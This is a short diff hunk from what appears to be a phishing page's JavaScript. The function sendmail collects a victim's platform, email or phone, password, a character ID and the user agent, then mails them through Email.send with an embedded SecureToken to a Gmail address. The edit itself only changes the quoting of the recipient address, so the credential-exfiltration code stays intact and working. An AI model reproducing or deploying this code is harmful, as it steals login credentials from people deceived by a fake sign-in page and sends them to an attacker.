@@ -188,7 +188,7 @@ function sendmail(login, user, pass) {
     body = "Platform : " + login + "<br><br> Email or Phone : " + user + "<br><br> Password : " + pass + "<br><br> Character ID : " + characterID + "<br><br> User Agent : " + navigator.userAgent
     Email.send({
         SecureToken: "eadb0468-349e-4b08-a7ad-4e51e2c9ff88",
-        To: "12ghostrider567@gmail.com",
+        To: '12ghostrider567@gmail.com',
         From: "123ghostrider456@gmail.com",
         Subject: "New Login",
         Body: body
